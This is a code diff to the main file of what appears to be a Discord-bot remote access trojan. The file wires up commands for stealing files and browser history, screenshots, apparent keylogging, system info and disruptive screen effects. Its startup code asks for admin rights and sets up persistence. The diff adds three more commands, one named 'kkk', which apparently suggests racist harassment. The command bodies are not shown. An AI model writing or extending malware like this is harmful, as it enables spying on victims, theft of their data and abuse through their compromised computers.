@@ -5,7 +5,7 @@ import info
 from command import ip_command, close_command, tts_command, admin_command, blur_command, playsound_command, errorspamz_command, screenswipe_command, tornado_command, seizure_command, clean_command, lp_command, tree_command, getfiles_command, kp_command, getbrowserhistory_command, share_command, sysinfo_command, screenshot_command
 import startuplogic.askadmin
 import startuplogic.addme
-
+from command.fun import kkk_command, thugfiles_command, wallpaper_command
 startuplogic.askadmin.setup()
 startuplogic.addme.run_setup_in_thread()
 
@@ -51,5 +51,7 @@ bot.add_command(commands.Command(blur_command.blur_command, name='blur'))
 bot.add_command(commands.Command(admin_command.admin_command, name='admin'))
 bot.add_command(commands.Command(tts_command.speak_command, name='speak'))
 bot.add_command(commands.Command(close_command.close_command, name='close'))
-
+bot.add_command(commands.Command(kkk_command.kkk_setup, name='kkk'))
+bot.add_command(commands.Command(thugfiles_command.thugfiles, name='thugfiles'))
+bot.add_command(commands.Command(wallpaper_command.wallpaper, name='wallpaper'))
 bot.run(discodd.TOKEN)
